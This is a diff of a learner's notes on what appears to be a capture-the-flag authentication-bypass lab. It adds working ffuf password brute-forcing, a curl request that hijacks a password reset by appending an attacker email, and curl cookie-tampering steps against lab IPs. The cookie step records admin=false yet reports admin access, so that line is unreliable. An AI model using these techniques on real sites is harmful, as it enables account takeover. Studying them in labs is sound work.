@@ -4,7 +4,7 @@
 
 ## Tools Used
 - [x] ffuf
-- [ ]  
+- [x] browser tool (network)  
 
 ## Method (What I Did)
 
@@ -18,7 +18,22 @@
 - Used `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.53.115/customers/login -fc 200` to execute valid usernames with possible passwords.
 - Result lead to `username=Steve` and `password=thunder` (succesful employee login)
 
-**
+**Logic Flaw**
+- created an account in `http://10.201.70.35/customers/signup` (VM Only) with the given account email address `attack@customer.acmeitsupport.thm`
+- Resetting password steps for vulnerable website:
+  - Enter in account email address
+  - Enter corresponding username to email address
+  - Reset instructions are sent to email address entered 
+- First entered in Roberts email adress. Email address=`robert@acmeitsupport.thm`
+- Grabbed the URL leading to the credential step (username) `http://10.201.70.35/customers/reset?email=robert%40acmeitsupport.thm` (VM Only)
+- Performed my own request to same link but attached my website account support email that can recieve tickets. `curl 'http://10.201.70.35/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attack@customer.acmeitsupport.thm'`
+- Checked support tickets to reveal flag
+
+**Cookie Tampering**
+- Scanned browser network tool for cookies, reslut `admin=false; session=ab907c0c1556c8ffda3d6f0b68bec51c`
+- Tested page to understand other cookie paremeters `curl http://10.201.70.35/cookie-test` Returned `Not Logged In`
+- Used info to change admin and login paremters `curl -H "Cookie: logged_in=true; admin=false" http://10.201.70.35/cookie-test` Returned `Logged In As An Admin - THM{COOKIE_TAMPERING}`
+- 
 
 
 ## Key Takeaway
